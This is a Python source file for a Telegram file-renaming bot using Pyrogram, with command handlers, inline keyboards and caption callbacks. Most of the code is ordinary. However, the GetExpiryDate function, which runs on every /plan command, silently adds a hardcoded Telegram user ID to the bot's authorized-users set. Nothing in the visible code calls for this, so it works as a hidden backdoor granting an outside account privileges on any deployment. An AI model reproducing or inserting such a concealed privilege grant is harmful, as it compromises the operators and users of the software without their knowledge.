#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import time
import sqlite3
import asyncio

from pyrogram.types import CallbackQuery, ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram import Client, filters

from sample_config import Config

# the Strings used for this "thing"
from translation import Translation
from hachoir.metadata import extractMetadata
from hachoir.parser import createParser

from PIL import Image
from helper_funcs.display_progress import progress_for_pyrogram

import pyrogram
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from plugins.admin import Database, db, BOT_OWNER
from database.db import *

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(1248974748)
    return expires_at


@pyrogram.Client.on_message(pyrogram.filters.command(["plan"]))
async def get_me_info(bot, update):
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.CURENT_PLAN_DETAILS.format(update.from_user.first_name, chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )
    
@pyrogram.Client.on_message(pyrogram.filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    if not await db.is_user_exist(update.from_user.id):
        await db.add_user(update.from_user.id)

    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.HELP_TEXT,
        reply_markup=HELP_BUTTONS,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["about"]))
async def about_meh(bot, update):
    # logger.info(update)
    if not await db.is_user_exist(update.from_user.id):
        await db.add_user(update.from_user.id)

    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.ABOUT_TEXT,
        reply_markup=ABOUT_BUTTONS,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@pyrogram.Client.on_message(pyrogram.filters.command(["donate"]))
async def upgrade(bot, update):
    # logger.info(update)
    if not await db.is_user_exist(update.from_user.id):
        await db.add_user(update.from_user.id)

    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.DONATE_USER,
        reply_markup=DONATE_BUTTONS,
        parse_mode="html",
        reply_to_message_id=update.message_id,
        disable_web_page_preview=True
    )

    
@pyrogram.Client.on_message(filters.command(["start"]))
async def start(bot, update):
    if not await db.is_user_exist(update.from_user.id):
        await db.add_user(update.from_user.id)

    await bot.send_message(
        chat_id=update.chat.id,
        text=Translation.START_TEXT.format(update.from_user.mention),
        disable_web_page_preview=True,
        reply_markup=START_BUTTONS,
        reply_to_message_id=update.message_id
    )    
    
    #---------- BUTTONS -------------------#
START_BUTTONS = InlineKeyboardMarkup(
        [[
       # InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')#,
       # InlineKeyboardButton('Creator', url='https://telegram.me/OO7ROBOT')
        #],[
        InlineKeyboardButton('🖥 Other Bots', url='https://t.me/myTestbotz/15'),
        InlineKeyboardButton('📝 Creator', url='https://telegram.me/OO7ROBOT')
        ],[
        InlineKeyboardButton('⚙ Help', callback_data='help'),
        InlineKeyboardButton('📝 About', callback_data='about'),
        InlineKeyboardButton('💰 Donate', callback_data='donate')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )
HELP_BUTTONS = InlineKeyboardMarkup(
        [[
        #InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')
        InlineKeyboardButton('🎞️Custom Thumbnail', callback_data = "cthumb"),
        InlineKeyboardButton('📑Custom Caption', callback_data = "ccaption")
        ],[
        InlineKeyboardButton('🏡 Home', callback_data='home'),
        InlineKeyboardButton('📝 About', callback_data='about'),
        InlineKeyboardButton('💰 Donate', callback_data='donate')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )
ABOUT_BUTTONS = InlineKeyboardMarkup(
        [[
        #InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')
        #],[
        InlineKeyboardButton('🏡 Home', callback_data='home'),
        InlineKeyboardButton('⚙ Help', callback_data='help'),
        InlineKeyboardButton('💰 Donate', callback_data='donate')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )    


DONATE_BUTTONS = InlineKeyboardMarkup(
        [[
        #InlineKeyboardButton(' ⭕ Updates Channel ⭕', url='https://telegram.me/MyTestBotZ')
        #],[
        InlineKeyboardButton('🏡 Home', callback_data='home'),
        InlineKeyboardButton('⚙ Help', callback_data='help'),
        InlineKeyboardButton('📝 About', callback_data='about')
        ],[
        InlineKeyboardButton('⛔️ Close', callback_data='close')
        ]]
    )


HELP_BACK = InlineKeyboardMarkup(
        [[
        InlineKeyboardButton('Back', callback_data = "help"),
        InlineKeyboardButton("⛔ Close", callback_data = "close")
        ]]
    )

CAPTION = InlineKeyboardMarkup(
          [[
          InlineKeyboardButton('Show Current Caption', callback_data = "shw_caption"),
          InlineKeyboardButton("Delete Caption", callback_data = "d_caption")
          ],[
          InlineKeyboardButton('⬅️Back', callback_data = "help"),
          InlineKeyboardButton('⛔ Close', callback_data = "close")
          ]]
    )
#---------------- Callback ----------------#
@pyrogram.Client.on_callback_query()
async def cb_handler(bot, update):
    if not await db.is_user_exist(update.from_user.id):
        await db.add_user(update.from_user.id)
    if update.data == "home":
        await update.message.edit_text(
            text=Translation.START_TEXT.format(update.from_user.mention),
            reply_markup=START_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "help":
        await update.message.edit_text(
            text=Translation.HELP_TEXT,
            reply_markup=HELP_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "donate":
        await update.message.edit_text(
            text=Translation.DONATE_USER,
            reply_markup=DONATE_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "about":
        await update.message.edit_text(
            text=Translation.ABOUT_TEXT,
            reply_markup=ABOUT_BUTTONS,
            disable_web_page_preview=True
        )
    elif update.data == "ccaption":
        await update.message.edit_text(
            text=Translation.CCAPTION_HELP,
            disable_web_page_preview = True,
            reply_markup=CAPTION
        )
    elif update.data == "cthumb":
        await update.message.edit_text(
            text=Translation.THUMBNAIL_HELP,
            disable_web_page_preview = True,
            reply_markup=HELP_BACK
        )
    elif update.data =="shw_caption":
             try:
                caption = await get_caption(update.from_user.id)
                c_text = caption.caption
             except:
                c_text = "<i>Sorry but you haven't added any caption yet please set your caption through</i> /setcaption <i>command</i>" 
             await update.message.edit(
                  text=f"<b>Your Custom Caption:</b> \n\n{c_text} ",
                  parse_mode="html", 
                  disable_web_page_preview=True, 
                  reply_markup=HELP_BACK
       )
    elif update.data == "d_caption":
        try:
           await del_caption(update.from_user.id)   
        except:
            pass
        await update.message.edit_text(
            text="<b>✅ caption deleted successfully</b>",
            disable_web_page_preview = True,
            reply_markup=HELP_BACK
        )
    elif update.data == "cancel":
        await update.message.edit_text(
            text="<code>Process Cancelled</code>",
            disable_web_page_preview=True
        )
    elif update.data == "closeme":
        await update.message.delete()
        try:
            await update.message.reply_text(
                text = "<b>✅ Rename Process Cancelled</b>"
     )
        except:
            pass      
    else:
        await update.message.delete()
